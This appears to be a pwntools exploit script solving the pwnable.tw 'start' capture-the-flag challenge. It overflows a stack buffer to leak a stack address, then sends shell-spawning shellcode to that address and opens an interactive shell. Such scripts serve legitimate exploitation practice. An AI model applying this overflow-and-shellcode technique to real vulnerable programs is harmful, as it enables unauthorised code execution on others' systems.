#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
#context.update(arch='i386')
##context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
exe = './start'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.remote:
        return remote('chall.pwnable.tw', 10000)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#print
#break *_start+47
#read
#break *_start+55
break *_start+60
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

context.arch = 'i386'
#io = start()
io = process('./start')
gdb.attach(io, gdbscript)
#payload = cyclic(200)


print(io.recv())
#payload = "A"*4
#payload = cyclic(200)
ret = p32(0x08048087) #_start+39

#Leak stack addresses
payload = fit({20:ret})
print(hexdump(payload))
io.send(payload)

stack_leak = io.recv()
print("Stack leak:")
print(hexdump(stack_leak))
print(hexdump(stack_leak[:4]))
print(u32(stack_leak[:4]))


#Shellcode
shellcode = asm(shellcraft.sh())
ret = p32(u32(stack_leak[:4]) + 20)
print("ESP:")
print(hex(u32(stack_leak[:4])))
print("Ret:")
print(hex(u32(stack_leak[:4])+20))
#payload = fit({20: ret, 24: shellcode}, filler='\x90', length=200)
#shellcode="A"*23
payload = fit({20: ret, 24: shellcode})
print(hexdump(payload))
io.send(payload)

#io.sendline('\x90'*10 + shellcode)

#



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

